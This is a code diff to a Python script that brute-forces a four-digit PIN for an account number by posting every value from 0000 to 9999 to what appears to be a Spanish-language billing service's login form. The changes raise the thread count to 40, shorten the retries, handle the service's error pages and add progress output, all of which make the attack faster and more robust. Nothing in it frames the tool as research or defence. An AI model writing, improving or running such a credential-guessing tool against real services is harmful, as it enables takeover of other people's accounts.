@@ -18,7 +18,7 @@ SALDOKEY = """DATOS_FACTURA"""
 
 
 @Async
-@Retry(30, pause=5)
+@Retry(15, pause=2)
 def login(loginNumber, password):
 
     data = urllib.urlencode({
@@ -36,16 +36,22 @@ def login(loginNumber, password):
             return password
         elif """El Nro. o Password ingresados son incorrectos""" in html:
             return False
+        elif """En este momento no podemos atender tu consulta.""" in html:
+            return None
+        else:
+#            print "error desconocido"
+            return None
 
 
 def main():
     loginNumber = sys.argv[1]
 
-    threads = 20
+    threads = 40
     pause = .1
     slots = [None] * threads
-    for password in ("%04d" % n for n in xrange(10000)):
-        debug("Probando %s" % password)
+    for number in xrange(10000):
+        password = "%04d" % number 
+        #debug("Probando %s" % password)
         passed = False
         tries = 0
         while not passed:
@@ -60,6 +66,12 @@ def main():
                         return 0
                     passed = True
                 if passed:
+                    if not number % 25:
+                        if not number % 250:
+                            print number / 100,
+                        else:
+                            sys.stdout.write(".")
+                        sys.stdout.flush()
                     slots[pos] = login(loginNumber, password)
                     break
             time.sleep(pause)
@@ -67,9 +79,6 @@ def main():
         if tries > 10:
             pause = pause * 10 + 0.001
 
-    for slot in slots:
-        if slot is not None:
-            slot.get_result()
 
 if __name__ == "__main__":
     exit(main())
